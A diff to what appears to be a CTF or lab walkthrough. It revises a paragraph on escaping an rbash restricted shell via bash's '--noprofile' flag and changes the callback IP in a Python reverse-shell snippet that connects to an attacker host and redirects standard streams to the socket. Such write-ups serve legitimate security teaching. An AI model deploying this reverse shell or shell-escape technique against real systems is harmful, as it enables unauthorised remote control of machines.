@@ -102,7 +102,7 @@ When we SSH to the device, we're greeted by a restricted shell.
 
 Escaping restricted shells could be a post in its own right so I'd recommend reading [Escape from SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells), if you're interested in the topic.
 
-We have a few options here.  We either utilise the above James exploit to write a payload to run `/bin/bash` when we log on, bypassing the shell, or return us a reverse shell.  Alternatively, we could just bash the `--noprofile` flag to bash on login as below, so rbash isn't loaded.
+To break out of this rbash shell we will need to use the `--noprofile` flag to bash on login as below, so rbash isn't loaded.
 
 ![](https://image.ibb.co/e1WhjG/5.png)
 
@@ -143,7 +143,7 @@ We'll place the following in tmp.py:
 ```python
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.15.174",1234))
+s.connect(("10.10.14.4",1234))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
